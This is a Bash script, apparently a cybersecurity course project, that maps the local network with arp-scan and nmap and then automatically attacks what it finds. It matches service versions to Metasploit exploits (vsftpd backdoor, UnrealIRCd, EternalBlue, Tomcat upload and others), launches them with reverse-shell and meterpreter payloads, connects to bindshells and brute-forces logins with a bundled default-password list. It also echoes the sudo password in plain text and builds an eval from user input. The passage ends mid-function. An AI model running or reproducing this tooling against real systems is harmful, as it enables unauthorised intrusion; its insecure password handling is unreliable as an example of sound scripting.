#!/bin/bash
#-----------------------------------------------------------------------------------
#	vulner.sh (For Linux)
#	Creator: Zi_WaF
#	Group: Centre for Cybersecurity (CFC311022)
#	Trainer: K. W.
#	whatis: vulner.sh	An automatic program to map all devices on the network, identifying services and potential vulnerabilities.
#
#	To run: bash vulner.sh
#-----------------------------------------------------------------------------------
trap "trap_all" 2 3 15
function trap_all(){  				# Set up for any interruptions and exit program cleanly
	rm -rf /tmp/vuln &>/dev/null
	rm -f ./hydra.restore &>/dev/null
	echo $pass | sudo -S systemctl stop postgresql &>/dev/null
	msfdb stop &>/dev/null
	echo -e "\n\t\033[1mGoodbye.\033[0m"
	exit 0
}
function bin_check(){				# Check for needed applications
	read -p "[sudo] password for script: " -s pass && echo ""
	sudo apt-get update -y 
	tput reset
	# Check for Nmap
	if [ "$(which nmap)" = "/usr/bin/nmap" ];then echo -e " \033[0;32m[+] Nmap Detected.\033[0m" && nmap --script-updatedb &> /dev/null
	else
		echo -e " \033[1;31m[-] Nmap NOT Detected.\033[0m Installing \e[1m\"Nmap\"\e[0m... Please wait."
		echo $pass | sudo -S apt-get install nmap -y &> /dev/null	
		nmap --script-updatedb &> /dev/null
		echo -e " \033[0;32m[+] Nmap Installed.\033[0m"
	fi
	# Update Metasploit Framework
	echo $pass | sudo -S apt-get install metasploit-framework -y 
	echo $pass | sudo -S systemctl start postgresql 
	msfdb init 
	echo -e " \033[0;32m[+] Metasploit Framework Updated.\033[0m"

	# Check for Gnome-terminal
	if [ "$(which gnome-terminal)" = "/usr/bin/gnome-terminal" ];then echo -e " \033[0;32m[+] Gnome-terminal Detected.\033[0m"
	else
		echo -e " \033[1;31m[-] Gnome-terminal NOT Detected.\033[0m Installing \e[1m\"Gnome-terminal\"\e[0m... Please wait."
		echo $pass | sudo -S apt-get install gnome-terminal -y &> /dev/null	
		echo -e " \033[0;32m[+] Gnome-terminal Installed.\033[0m"
	fi
	# Check for Hydra
	if [ "$(which hydra)" = "/usr/bin/hydra" ];then echo -e " \033[0;32m[+] Hydra Detected.\033[0m"
	else
		echo -e " \033[1;31m[-] Hydra NOT Detected.\033[0m Installing \e[1m\"Hydra\"\e[0m... Please wait."
		echo $pass | sudo -S apt-get install hydra -y &> /dev/null	
		echo -e " \033[0;32m[+] Hydra Installed.\033[0m"
	fi
	# Check for arp-scan
	if [ "$(which arp-scan)" = "/usr/sbin/arp-scan" ];then echo -e " \033[0;32m[+] arp-scan Detected.\033[0m"
	else
		echo -e " \033[1;31m[-] arp-scan NOT Detected.\033[0m Installing \e[1m\"arp-scan\"\e[0m... Please wait."
		echo $pass | sudo -S apt-get install arp-scan -y &> /dev/null	
		echo -e " \033[0;32m[+] arp-scan Installed.\033[0m"
	fi
}
function setup(){ 					# Initial setup
	rm -rf /tmp/vuln &>/dev/null
	mkdir /tmp/vuln 2>/dev/null
	echo "$pass" | sudo -S chmod 777 ./vulner
	clear
	
	# Header for setup screen
	echo -e "\033[1m[Start vulner.sh]\n\033[0m" > /tmp/vuln/setup
	echo -e "\e[1;32m Welcome, $(hostname) [$(hostname -I | sed 's/ //')]\e[0m" >> /tmp/vuln/setup
	echo -e "\n\e[1m   whatis [vulner.sh]:\n      Vulnerability scanner and weak passwords checker for device(s) on local network.\e[0m" >> /tmp/vuln/setup
	echo -e "\n      Username List: \"<No Username>\"" >> /tmp/vuln/setup
	echo -e "      Password List: \"<No Password>\"" >> /tmp/vuln/setup
	echo -e "\n      s) Start scan.\n      1) Specify a Username List.\n      2) Specify a Password List.\n      3) Create a new Username List.\n      4) Create a new Password List." >> /tmp/vuln/setup
	username_path=""
	password_path=""
	
	# Check if any report(s) existed in the vulner directory
	vuln_dir=$(find ~ -type d -name 'vulner') 2>/dev/null
	vuln_reports=$(find $vuln_dir -type f -name *_report)

	# if report exists, include it in the option
	if [ -n "$vuln_reports" ];then
		echo "      5) View Report(s)." >> /tmp/vuln/setup
		# Append a number at the beginning of each report
		counter=1
		while read line
		do
			line_file=$(echo "$line" | awk -F/ '{print $NF}')
			avail_reports+=$(echo -e "$counter) $line_file")$'\n'
			((counter++))
		done < <(echo "$vuln_reports")
	fi

	# Display the options available
	clear && cat /tmp/vuln/setup && echo ""
	while true; do
		echo -ne "\033[1m      Choose your option (To quit, enter 'q'.)\033[0m: " && read choose_start
		case $choose_start in
			q|Q) # Quit Program
				trap_all;;
			s) # Start scan
				if [ -n "$username_path" ] && [ -n "$password_path" ];then
					start_scan && break
				else
					echo -e "\n\t\033[1m      Please specify both Username List and Password List.\033[0m\n\t      Press 'Enter' to continue." && read -r
					clear && cat /tmp/vuln/setup && echo ""
				fi
				;;
			1) # Specify file for Username List
				while true;do
					clear && cat /tmp/vuln/setup | sed 's/\([1-9]\|[1-9][0-9]\|20\))/#)/g' | sed 's/s)/#)/g' && echo ""
					highlight "setup" "$choose_start)"
					file_name=""
					echo -ne "\033[1m      Specify the filename of Username List.\033[0m\n      To use default [pass.lst], press 'Enter'. To go back, enter 'b'.: " && read file_name
					if [ -z "$file_name" ]; then file_selection "U" "setup" "$choose_start)";elif [ "$file_name" == "b" ];then clear && cat /tmp/vuln/setup && echo "";break;else file_selection "U" "setup" "$choose_start)" "$file_name";fi
					if [ $? == 0 ];then break;fi
				done
				;;
			2) # Specify file for Password List
				while true;do
					clear && cat /tmp/vuln/setup | sed 's/\([1-9]\|[1-9][0-9]\|20\))/#)/g' | sed 's/s)/#)/g' && echo ""
					highlight "setup" "$choose_start)"
					file_name=""
					echo -ne "\033[1m      Specify the filename of Password List.\033[0m\n      To use default [pass.lst], press 'Enter'. To go back, enter 'b'.: " && read file_name
					if [ -z "$file_name" ]; then file_selection "P" "setup" "$choose_start)";elif [ "$file_name" == "b" ];then clear && cat /tmp/vuln/setup && echo "";break;else file_selection "P" "setup" "$choose_start)" "$file_name";fi
					if [ $? == 0 ];then break;fi
				done
				;;
			3) # Create a list of Usernames
				create_list "usernames" "setup" "$choose_start)" ;;
			4) # Create a list of Passwords
				create_list "passwords" "setup" "$choose_start)" ;;
			5) # View report
				highlight "setup" "$choose_start)"
				echo "$avail_reports" | sed 's/^/\t/g'
				while true;do
					echo -ne "\033[1m\tChoose your option. \033[0m(To go back, enter 'b'.)\033[0m: " && read choose_report
					if [ "$choose_report" == "b" ] || [ "$choose_report" == "B" ];then
						clear && cat /tmp/vuln/setup && echo ""
						break
					elif [[ $choose_report =~ ^([1-9]|1[0-9])$ ]] && (( $choose_report <= $(echo "$avail_reports" | grep -v '^$' | wc -l) ));then
						report_name=$(echo "$avail_reports" | grep ^$choose_report | awk '{print $NF}')
						report_path=$(echo "$vuln_reports" | grep -w $report_name)
						
						# Navigate highlighter for report selection
						report_sel=$(echo "$avail_reports" | grep -v '^$' | grep ^$choose_report)
						report_effect=$(echo "$avail_reports" | grep -v '^$' | grep ^$choose_report | sed -n "/$report_sel/{s/^/\x1b[1m\x1b[36m/;s/$/\x1b[0m/;p;q}")
						clear && cat /tmp/vuln/setup | sed 's/\([1-9]\|[1-9][0-9]\|20\))/#)/g' | sed 's/s)/#)/g' && echo ""
						echo "$avail_reports" | grep -v '^$' |  sed "s/$report_sel/$report_effect/g" | sed 's/^/\t/g' && echo ""
						gnome-terminal --tab --title "$report_name" --wait -- bash -c "cat $report_path; read bash"
					fi
				done
				;;
		esac
	done	
}
function setup_editor(){ 			# Append new data to screen
	current_User=$(grep "Username List:" /tmp/vuln/$3 | awk -F\" '{print $2}')
	current_Pass=$(grep "Password List:" /tmp/vuln/$3 | awk -F\" '{print $2}')
	replace="$2"
	case $1 in
		U) sed -i "s#Username List: \"$current_User\"#Username List: \"$2\"#g" /tmp/vuln/$3 ;;
		P) sed -i "s#Password List: \"$current_Pass\"#Password List: \"$2\"#g" /tmp/vuln/$3 ;;
	esac
}
function highlight(){				# Selection highlighter
	choice_sel=$(cat /tmp/vuln/$1 | grep $2)
	selection_effect=$(cat /tmp/vuln/$1 | grep $2 | sed -n "/$choice_sel/{s/^/\x1b[1m\x1b[36m/;s/$/\x1b[0m/;p;q}")
	clear
	cat /tmp/vuln/$1 | sed "s/$choice_sel/$selection_effect/g" | sed 's/\([1-9]\|[1-9][0-9]\|20\))/#)/g' | sed 's/s)/#)/g'
	echo ""
}
function file_selection(){			# Specify the username and password list 
	# Create a simple username list and password list.
	echo "msfadmin user postgres sys batman klog 123456789 service ledeen 123123 password root admin rwaaaaawr5 public chewbacca vagrant sploit bobafett tomcat user manager Administrator axis2 s3cret" | tr ' ' '\n' > /tmp/vuln/pass.lst
	
	local file_type="$1"
	local default_file_name=""
	local path_var_name=""
	
	# Check if file selection is for Username or Password List
	if [[ "$file_type" == "U" ]]; then
		default_file_name="pass.lst"
		path_var_name="$file_name"
	elif [[ "$file_type" == "P" ]]; then
		default_file_name="pass.lst"
		path_var_name="$file_name"
	else
		return 1
	fi
	
	clear && cat /tmp/vuln/$2
	highlight "$2" "$3"
	while true; do
		local file_path=""
		local file_list_append=""
		# Check if file selection named is variable or default
		if [[ -z "$file_name" ]]; then
			file_path=$(find /tmp/vuln -type f -name "$default_file_name" 2>/dev/null | head -n 1)
		else
			# Check if variable name selected file exist
			file_list=$(find / -type f -name "$file_name" 2>/dev/null)
			if [ ! -n "$file_list" ];then
				echo -e "\033[1m\t[Not Specified] File does not exist.\033[0m\n\tPress 'Enter' to continue." && read -r
				return 1
			fi
			# if receive multiple results
			count=1
			while read line;do
				file_list_append+=$(echo -e "$count) $line")$'\n'
				((count++))
			done < <(echo "$file_list")
			while true; do
				clear && cat /tmp/vuln/$2
				highlight "$2" "$3" | sed 's/\([1-9]\|[1-9][0-9]\|20\))/#)/g' | sed 's/s)/#)/g'
				echo -e "$file_list_append" | sed 's/^/\t\t/g'
				echo -ne "\t\tSelect: " && read file_choice
				if [ -z "$file_choice" ];then
					file_path=$(echo "$file_list_append" | grep -w ^1 | awk '{print $NF}')
					break
				elif [[ $file_choice =~ ^([1-9]|1[0-9])$ ]] && (( $file_choice <= $(echo "$file_list_append" | grep -v '^$' | wc -l) ));then
					file_path=$(echo "$file_list_append" | grep -w ^$file_choice | awk '{print $NF}')
					break
				fi
			done
		fi
		# File selected path exists; assign as path and update first display screen
		if [[ -f "$file_path" ]]; then
			eval "$path_var_name=\"$file_path\""
			setup_editor "$file_type" "$file_path" "$2"
			clear && cat /tmp/vuln/$2 && echo ""
			if [[ "$file_type" == "U" ]]; then
				declare -g username_path="$file_path"
				break
			elif [[ "$file_type" == "P" ]]; then
				declare -g password_path="$file_path"
				break
			fi
		fi
	done
}
function create_list() { 			# Create a list using nano editor
	local file_type="$1"
	clear && cat /tmp/vuln/$2 && echo ""
	highlight "$2" "$3"
	echo -ne "\033[1m      Enter a filename.\033[0m\n      To use default [$file_type.lst], press 'Enter'. To go back, enter 'b'.: " && read filename
	if [ -z "$filename" ];then
		filename="$file_type.lst"
	elif [ "$filename" == "b" ];then
		clear && cat /tmp/vuln/$2 && echo ""
		return 1
	fi
	qterminal -e "nano \"$filename\"" 2>/dev/null
	echo -e "\033[1m      File saved as \"$filename\"."
	# if the file was created; update display screen and saved as username/password path
	if [ -s "$filename" ]; then
		if [ "$file_type" = "usernames" ]; then
			declare -g username_path=$(find . -type f -name "$filename" 2>/dev/null | head -n 1)
			setup_editor "U" "$username_path" "$2"
		elif [ "$file_type" = "passwords" ]; then
			declare -g password_path=$(find . -type f -name "$filename" 2>/dev/null | head -n 1)
			setup_editor "P" "$password_path" "$2"
		fi
	fi
	clear && cat /tmp/vuln/$2 && echo ""
}
function start_scan(){				# Scan local network
	clear
	mkdir ./vulner 2>/dev/null
	# Report Header
	echo -e "\033[1m\e[4m\nVulnerability Testing Report on $(ip a | grep $(hostname -I) | awk '{print$2}')\033[0m\e[0m" > /tmp/vuln/period.log
	echo -e "\e[1mTester\e[0m: $(hostname)" >> /tmp/vuln/period.log
	echo -e "\e[1mStart Date:\e[0m $(date "+%d %B %Y")" >> /tmp/vuln/period.log
	echo -e "\e[1mStart Time:\e[0m $(date "+%T %p")" >> /tmp/vuln/period.log
	
	# Display Brute-force list selected
	clear
	echo -e "\033[1m[Commence vulner.sh]\n\033[0m" > /tmp/vuln/local.net
	echo -e "\033[1mBrute-force list selected\033[0m:" >> /tmp/vuln/local.net
	echo -e "   Username List: $username_path" >> /tmp/vuln/local.net
	echo -e "   Password List: $password_path\n" >> /tmp/vuln/local.net	
	
	# Display Network Information
	echo -e "\033[1mLocal Network Information\033[0m:" >> /tmp/vuln/local.net
	echo "$pass" | sudo -S arp-scan --localnet --numeric --ignoredups | grep -E '([a-f0-9]{2}:){5}[a-f0-9]{2}' | awk '{print $0}' >> /tmp/vuln/local.net
	host=$(cat /tmp/vuln/local.net | grep -w Interface | awk '{print $NF}')
	gate=$(route -n | grep UG | tr -d '\s' | awk '{print $2}')	# identify the host and gateway in the local network
	cidr=$(ip a | grep $(hostname -I) | awk '{print$2}')

	echo -e "\n\e[1mHost IP Address\e[0m: $host" >> /tmp/vuln/local.net
	echo -e "\e[1mGateway IP Address\e[0m: $gate" >> /tmp/vuln/local.net
	echo -e "\e[1mCIDR\e[0m: $cidr" >> /tmp/vuln/local.net
	echo -e "\e[1mIP Range\e[0m: $(netmask -r $cidr | sed 's/^   //g' | sed 's/  / /g' | sed 's/-/ - /g')" >> /tmp/vuln/local.net
	echo "" >> /tmp/vuln/local.net

	# display IP addresses in the local network
	cat /tmp/vuln/local.net

	# Scan for open ports for all ip addresses available
	count=1
	available_ips=$(cat /tmp/vuln/local.net | grep ^[0-9] | awk '{print$1}' | grep -vw "$gate" | grep -v "\.1$" | grep -v "\.254$")
	
	echo -ne " Scanning the network. \e[5m*Please wait.*\r\e[25m"
	option=""
	for avail_ip in $(echo "$available_ips");do 
		nmap --max-rtt-timeout 100ms ${avail_ip} -p- -Pn -n --open -T4 | grep -we "Nmap scan report" -we "open" > /tmp/vuln/${avail_ip}_open
		open_ports=$(cat /tmp/vuln/${avail_ip}_open | grep -we "open" | wc -l)
		if [ $open_ports -ne 0 ];then
			option+=$(echo "$count) ${avail_ip} ($open_ports open ports)")$'\n'
		fi
		((count++))
	done
	
	# Detect number of device(s) with open ports
	echo -e "$(date "+%T %p") [$cidr] Number of device(s) found: $(echo "$available_ips" | grep ^[0-9] | wc -l)" | tee -a /tmp/vuln/local.net
	echo -e "$available_ips" | grep ^[0-9] | sed 's/^/\t/' | tee -a /tmp/vuln/local.net
	echo "" | tee -a /tmp/vuln/local.net
	echo -e "$(date "+%T %p") [$cidr] Scanning for open ports completed." | tee -a /tmp/vuln/local.net
	echo -e "$(date "+%T %p") [$cidr] Number of device(s) found with open ports: $(echo -e "$option" | grep -w ^[0-9] | wc -l)" | tee -a /tmp/vuln/local.net
	if  [ $(echo -e "$option" | grep -w ^[0-9] | wc -l) == 0 ];then
		echo -e "\n\tNo open ports available on any device. Exiting..." && trap_all
	fi
	echo -e "$option" | grep -w ^[0-9] | cut -d ' ' -f 2- | sed 's/^/\t/' | tee -a /tmp/vuln/local.net
	echo "" | tee -a /tmp/vuln/local.net
	
	# Scan process of open ports for vulnerability
	declare -g	ip_list=$(echo "$option" | awk '{print$2}')
	for IPX in $ip_list;do
		# Commence vulnerability scan
		vuln_scan
		
		# Search possible metasploit modules
		exploit
		
		# Commence Weak Passwords Check on first service login
		line1=$(cat ./vulner/${IPX}/${IPX}_vulnscan | grep -w open | grep ^[0-9] | grep -ie ftp -ie ssh -ie telnet -ie posgres -ie samba -ie smbd -ie rdp -ie mysql | head -n 1)
		service=$(echo $line1 | awk '{print $3}')
		port=$(echo $line1 | awk -F/ '{print $1}')
		echo "" > ./vulner/${IPX}/${IPX}_wpc
		
			# Check if service login is available
			if [ -n "$line1" ];then
				weak_passwords_check "$IPX" "$service" "$port" "$username_path" "$password_path"
			else
				echo -e "\n\e[1;32mWeak Passwords Check [auto]: \n[$IPX]\e[0m" > ./vulner/${IPX}/${IPX}_wpc
				echo -e "\033[1mDate\033[0m: $(date "+%d %B %Y")" >> ./vulner/${IPX}/${IPX}_wpc
				echo -e "\033[1mTime\033[0m: $(date "+%T %p")" >> ./vulner/${IPX}/${IPX}_wpc
				echo -e "\n\033[1m   No Service Login available on this device.\033[0m" >> ./vulner/${IPX}/${IPX}_wpc
			fi
		
		# Compile Report
		echo -e "\e[1mEnd Date:\e[0m $(date "+%d %B %Y")" >> /tmp/vuln/${IPX}_start
		echo -e "\e[1mEnd Time:\e[0m $(date "+%T %p")" >> /tmp/vuln/${IPX}_start
		echo -e "$(date "+%T %p") [$IPX] Report is available.\n" | tee -a /tmp/vuln/local.net 
		report "$IPX"
	done

	# Display the options (local.net is the initial auto-scan and local.net2 is for after the auto-scan)
	echo -e "${option}" | grep -w ^[0-9] > /tmp/vuln/local.net2
}
function vuln_scan(){				# Scan available IP addresses
	# Do a scan for only open ports
	ports=$(cat /tmp/vuln/${IPX}_open | grep -w open | awk -F/ '{print $1}')
	open_ports=$(echo "$ports" | tr '\n' ',' | sed 's/,$//')
	if [ -z "$open_ports" ]; then echo -e "$(date "+%T %p") [$IPX] Host seems down or NO OPEN Ports available." | tee -a /tmp/vuln/local.net;
	else
		# Create a dedicated folder for each IP address
		mkdir ./vulner/${IPX} 2>/dev/null
		echo -ne " Scanning $IPX. \e[5m*Please wait.*\r\e[25m"
		
		# Report Header
		echo -e "\e[1;4;33mVulnerability Scan on $IPX\e[0m" > /tmp/vuln/${IPX}_start
		echo -e "\e[1mTester\e[0m: $(hostname)" >> /tmp/vuln/${IPX}_start
		echo -e "\e[1mStart Date:\e[0m $(date "+%d %B %Y")" >> /tmp/vuln/${IPX}_start
		echo -e "\e[1mStart Time:\e[0m $(date "+%T %p")" >> /tmp/vuln/${IPX}_start			
		
		# Start vulnerability scan
		echo $pass | "sudo" -S nmap $IPX -p "$open_ports" -Pn -n -sV -O --script=vuln,smb-os-discovery,http-barracuda-dir-traversal,http-coldfusion-subzero,jdwp-exec,jdwp-inject,smb-webexec-exploit > ./vulner/${IPX}/${IPX}_vulnscan
		echo -e "$(date "+%T %p") [$IPX] Vulnerability scan completed." | tee -a /tmp/vuln/local.net
		
		# Organize the result of vulnerability scan
		file_path="./vulner/${IPX}/${IPX}_vulnscan"
		echo -e "\nScanning Time: $(grep "^Nmap done:" "$file_path" | awk '{print $(NF-1), $NF}')" > /tmp/vuln/${IPX}_edited
		grep "^MAC Address:" "$file_path" >> /tmp/vuln/${IPX}_edited
		grep "^Device type:" "$file_path" >> /tmp/vuln/${IPX}_edited
		grep "^Running:" "$file_path" >> /tmp/vuln/${IPX}_edited
		grep "^OS CPE:" "$file_path" >> /tmp/vuln/${IPX}_edited
		grep "^OS details:" "$file_path" >> /tmp/vuln/${IPX}_edited
		grep "^Service Info:" "$file_path" >> /tmp/vuln/${IPX}_edited
		grep "^Network Distance:" "$file_path" >> /tmp/vuln/${IPX}_edited
		echo "" >> /tmp/vuln/${IPX}_edited
		grep "^PORT" "$file_path" >> /tmp/vuln/${IPX}_edited
		
		if [ -z "$(cat "$file_path" | grep '^|')" ];then
			echo -e "\n\033[1m   Nmap scan unable to detect any vulnerability on this device." >> /tmp/vuln/${IPX}_edited
		else
			cat "$file_path" | grep -B1 "^|" | sed 's/^--//g; s/^|/  |/g; /^$/d; 2,$ s/^[0-9]/\n&/' | sed 's/Host/\nHost/' >> /tmp/vuln/${IPX}_edited
			#cat "$file_path" | sed -n 'N;/NOT VULNERABLE\|false\|ERROR\|Error/!P;D' | grep -B1 "^|" | sed 's/^--//g; s/^|/  |/g; /^$/d; 2,$ s/^[0-9]/\n&/' >> /tmp/vuln/${IPX}_edited
		fi
	fi
}
function modules(){					# Possible known modules
	local port=$(echo $1 | awk -F/ '{print $1}')
	matches=""
	case "$1" in
    *vsftpd*2.3.4*) matches+=$(echo "exploit/unix/ftp/vsftpd_234_backdoor");;						# ftp
    *http*phpinfo.php*) matches+=$(echo "exploit/multi/http/php_cgi_arg_injection");;				# http 
    *java-rmi*)																						# java-rmi
		test_java=$(msfconsole -qx "use auxiliary/scanner/misc/java_rmi_server; set rhosts $2; set rport $port;run;exit" | grep "Endpoint Detected" | awk '{print $NF}')
		if [ "$test_java" == "Enabled" ]; then matches+=$(echo "exploit/multi/misc/java_rmi_server");fi;;
	*Samba*3.X*4.X*) matches+=$(echo "exploit/multi/samba/usermap_script");;						# samba
    *postgresql*DB*8.3.0*8.3.7*) matches+=$(echo "exploit/linux/postgres/postgres_payload");;		# postgresql
    *mysql*) matches+=$(echo "auxiliary/scanner/mysql/mysql_login");;								# mysql
    *login*rlogind*) matches+=$(echo "auxiliary/scanner/rservices/rlogin_login");;					# rlogin
    *irc*UnrealIRCd*) matches+=$(echo "exploit/unix/irc/unreal_ircd_3281_backdoor");;				# irc
	*distccd*v1*) matches+=$(echo "exploit/unix/misc/distcc_exec");;								# distccd
    *VNC*protocol*3.3*) matches+=$(echo "auxiliary/scanner/vnc/vnc_login");;						# vnc
    *http*Apache*Tomcat*engine*1.1*) matches+=$(echo "auxiliary/scanner/http/dir_scanner")$'\n';; 	# Apache
	*bindshell*) matches+=$(echo "\"netcat command\" for bindshell");;								# bindshell
	*ProFTPD*1.3.5*) matches+=$(echo "exploit/unix/ftp/proftpd_modcopy_exec");;						# proftp
	*Apache*httpd*2.4.7*) matches+=$(echo "exploit/multi/http/apache_mod_cgi_bash_env_exec");;		# Apache 2.4.7
	*WEBrick*httpd*1.3.1*Ruby*2.3.8*) matches+=$(echo "exploit/multi/http/rails_actionpack_inline_exec");;	# WeBrick http
	*Jetty*8.1.7*) matches+=$(echo "exploit/linux/http/apache_continuum_cmd_exec");;
	*Apache*PHP/5.3.10*DAV/2*) matches+=$(echo "auxiliary/scanner/http/wordpress_login_enum");;
	*microsoft-ds*Windows*Server*2008*R2*) matches+=$(echo "auxiliary/scanner/smb/smb_login");;
	esac
	case "$1" in
	*http*Apache*Tomcat*engine*1.1*) matches+=$(echo "auxiliary/scanner/http/tomcat_mgr_login")$'\n';;	# Apache
	esac
	case "$1" in
	*http*Apache*Tomcat*engine*1.1*) matches+=$(echo "exploit/multi/http/tomcat_mgr_upload");;		# Apache
	esac
	echo "$matches"
}
function meta_sploit(){				# Commands to run metasploit
	port=$(echo $1 | awk -F/ '{print $1}')
	exp_mod=$(echo $1 | awk '{print $NF}')
	
	case $exp_mod in
	exploit/unix/ftp/vsftpd_234_backdoor) echo -e "\n\033[1;31mExploit Port: $port [$exp_mod]\033[0m\n" && qterminal -e "msfconsole -qx \"use $exp_mod; set payload cmd/unix/interact; set rhosts $IPX; set rport $port; run\"" 2>/dev/null;;
	exploit/unix/irc/unreal_ircd_3281_backdoor) echo -e "\n\033[1;31mExploit Port: $port [$exp_mod]\033[0m\n" && qterminal -e "msfconsole -qx \"use $exp_mod; set rhosts $IPX; set rport $port; set payload payload/cmd/unix/reverse; set lhost $host; set lport 7772; run\"" 2>/dev/null;;
	auxiliary/scanner/http/tomcat_mgr_login) echo -e "\n\033[1;31mExploit Port: $port [$exp_mod]\033[0m\n" && qterminal -e "msfconsole -qx \"use $exp_mod; set rhosts $IPX; set rport $port; set user_file $username_path; set pass_file $password_path; set blank_passwords true; set verbose true; run\"" 2>/dev/null;;
	exploit/multi/http/tomcat_mgr_upload) echo -e "\n\033[1;31mExploit Port: $port [$exp_mod]\033[0m\n" && qterminal -e "msfconsole -qx \"use $exp_mod; set rhosts $IPX; set rport $port; set httpusername tomcat; set httppassword tomcat; set lport 7773; run\"" 2>/dev/null;;
	exploit/multi/misc/java_rmi_server) echo -e "\n\033[1;31mExploit Port: $port [$exp_mod]\033[0m\n" && qterminal -e "msfconsole -qx \"use $exp_mod;set payload java/meterpreter/reverse_tcp; set rhosts $IPX; set rport $port; set lport 7774; run\"" 2>/dev/null;;
	auxiliary/scanner/rservices/rlogin_login) echo -e "\n\033[1;31mExploit Port: $port [$exp_mod]\033[0m\n" && qterminal -e "msfconsole -qx \"use $exp_mod; set rhosts $IPX; set rport $port; set userpass_file $username_path;set user_file $password_path;set user_as_pass true; run\"" 2>/dev/null;;
	exploit/unix/misc/distcc_exec) echo -e "\n\033[1;31mExploit Port: $port [$exp_mod]\033[0m\n" && qterminal -e "msfconsole -qx \"use $exp_mod; set rhosts $IPX; set rport $port; set payload cmd/unix/reverse; set lport 7775; run\"" 2>/dev/null;;
	auxiliary/scanner/vnc/vnc_login) echo -e "\n\033[1;31mExploit Port: $port [$exp_mod]\033[0m\n" && qterminal -e "msfconsole -qx \"use $exp_mod; set rhosts $IPX; set rport $port;set lport 7776; run\"" 2>/dev/null;;
	bindshell) echo -e "\n\033[1;31mExploit Port: $port [$exp_mod]\033[0m\n" && qterminal -e "nc ${IPX} $port" 2>/dev/null;;
	exploit/unix/ftp/proftpd_modcopy_exec) echo -e "\n\033[1;31mExploit Port: $port [$exp_mod]\033[0m\n" && qterminal -e "msfconsole -qx \"use $exp_mod; set rhosts $IPX; set rport_ftp $port; set rport 80;set payload cmd/unix/reverse_perl;set sitepath /var/www/html; run\"" 2>/dev/null;;
	exploit/multi/http/rails_actionpack_inline_exec) echo -e "\n\033[1;31mExploit Port: $port [$exp_mod]\033[0m\n" && qterminal -e "msfconsole -qx \"use $exp_mod; set rhosts $IPX; set rport $port;set payload ruby/shell_reverse_tcp;set targetparam os;set targeturi /readme; run\"" 2>/dev/null;;
	exploit/linux/http/apache_continuum_cmd_exec) echo -e "\n\033[1;31mExploit Port: $port [$exp_mod]\033[0m\n" && qterminal -e "msfconsole -qx \"use $exp_mod; set rhosts $IPX; set rport $port;set payload linux/x86/meterpreter/reverse_tcp; run\"" 2>/dev/null;;
	exploit/multi/http/apache_mod_cgi_bash_env_exec) echo -e "\n\033[1;31mExploit Port: $port [$exp_mod]\033[0m\n" && qterminal -e "msfconsole -qx \"use $exp_mod; set rhosts $IPX; set rport $port;set targeturi /cgi-bin/hello_world.sh; run\"" 2>/dev/null;;
	exploit/multi/elasticsearch/script_mvel_rce) echo -e "\n\033[1;31mExploit ELK Vulnerability [$exp_mod]\033[0m\n" && qterminal -e "msfconsole -qx \"use $exp_mod; set rhosts $IPX; run\"" 2>/dev/null;;
	exploit/windows/smb/ms17_010_eternalblue) echo -e "\n\033[1;31mExploit Eternal Blue Vulnerability [$exp_mod]\033[0m\n" && qterminal -e "msfconsole -qx \"use $exp_mod;set payload windows/x64/meterpreter/reverse_tcp; set rhosts $IPX; set lhost $host; run\"" 2>/dev/null;;
	auxiliary/scanner/snmp/snmp_enumusers) echo -e "\n\033[1;31mEnumerate SNMP Users [$exp_mod]\033[0m\n" && qterminal -e "msfconsole -qx \"use $exp_mod; set rhosts $IPX; run\"" 2>/dev/null;;
	auxiliary/scanner/http/wordpress_login_enum) echo -e "\n\033[1;31mExploit Port: $port [$exp_mod]\033[0m\n" && qterminal -e "msfconsole -qx \"use $exp_mod; set rhosts $IPX; set rport $port;set targeturi /wordpress;set user_file $username_path;set pass_file $password_path; set verbose false;set stop_on_success false;set blank_passwords true; run\"" 2>/dev/null;;
	auxiliary/scanner/mysql/mysql_login) echo -e "\n\033[1;31mBrute-Force mySQL Login [$exp_mod]\033[0m\n" && qterminal -e "msfconsole -qx \"use $exp_mod; set rhosts $IPX; set verbose false;set blank_passwords true;set user_file $username_path;set pass_file $password_path; run\"" 2>/dev/null;;
	auxiliary/scanner/smb/smb_login) echo -e "\n\033[1;31mBrute-Force SMB Login [$exp_mod]\033[0m\n" && qterminal -e "msfconsole -qx \"use $exp_mod; set rhosts $IPX; set verbose true;set blank_passwords true;set user_file $username_path;set userpass_file $password_path; run\"" 2>/dev/null;;
	
	*) echo -e "\n\033[1;31mExploit Port: $port [$exp_mod]\033[0m\n" && qterminal -e "msfconsole -qx \"use $exp_mod; set rhosts $IPX; set rport $port; set lhost $host; run\"" 2>/dev/null;;
	esac	
}
function exploit(){					# Match the modules available
	# Filter the scan results
	file_path=./vulner/${IPX}/${IPX}_vulnscan
	while read line; do
		if [[ $line =~ ^[0-9]+ ]]; then
			number=$line
		fi
		# Check for keywords
		if [[ ! -z "$(echo $line | grep -i "vsftpd 2.3.4\|unrealircd\|phpinfo.php\|exploits\|java-rmi\|mysql\|Samba smbd 3.X - 4.X\|PostgreSQL DB 8.3.0 - 8.3.7\|Command Execution\|rlogind\|bindshell\|VNC (protocol 3.3)\|Apache Tomcat/Coyote JSP engine 1.1\|ProFTPD 1.3.5\|Apache httpd 2.4.7\|WEBrick httpd 1.3.1\|microsoft-ds.*Windows.*Server.*2008.*R2\|Jetty 8.1.7\|Apache.*PHP/5.3.10.*DAV/2")" ]]; then
				if [ "$number" == "$line" ];then
					echo "$number"
				else
					echo "$number"
					echo "$line"
				fi
		fi
	done < "$file_path" > /tmp/vuln/unfiltered.txt
	cat /tmp/vuln/unfiltered.txt | awk '!a[$0]++' | sed 's/^|       / /g' | sed 's/^|   \// /g' | sed 's/|_      / /g' | sed 's/^|   / /g' | sed 's/^|_/ /g' | sed -e ':a;N;$!ba;s/\n / /g' > /tmp/vuln/filtered.txt
	
	# Append the module and link it to related Port
	exploit_ports=""
	exploit_ports=$(grep -o -Ff ./vulner/${IPX}/${IPX}_vulnscan /tmp/vuln/filtered.txt | sed 's/open//g')
	exploit_found=""
	module=""
	while IFS= read -r lineA && IFS= read -r lineB <&3; do
		module=$(modules "$lineA" "$IPX")
		match=$(echo "$module" | sed '/^$/d' | wc -l)
		if [ -n "$module" ];then
			if [ "$match" == 1 ];then		# if a match found
				exploit_found+=$(echo -e "\n$lineB")
				exploit_found+=$(echo -e "\t$module")
			elif [ "$match" > 1 ];then		# if more that one match found
				for i in $(echo "$module");do
					exploit_found+=$(echo -e "\n$lineB")
					exploit_found+=$(echo -e "\t$i")
				done
			fi
		fi
	done </tmp/vuln/filtered.txt 3< <(echo "$exploit_ports")
	# Test ELK vulnerability
